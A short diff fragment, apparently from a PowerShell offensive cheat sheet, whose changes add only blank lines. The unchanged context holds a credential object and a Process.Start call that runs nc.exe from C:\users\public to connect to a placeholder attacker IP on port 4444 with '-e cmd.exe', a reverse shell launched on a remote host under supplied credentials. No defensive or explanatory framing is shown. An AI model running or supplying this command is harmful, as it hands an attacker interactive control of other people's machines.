@@ -17,3 +17,5 @@ $mycreds = New-Object System.Management.Automation.PSCredential ("<user>", $secp
 $computer = "<hostname>"
 [System.Diagnostics.Process]::Start("C:\users\public\nc.exe","<attacker_ip> 4444 -e cmd.exe", $mycreds.Username, $mycreds.Password, $computer)
 ```
+
+
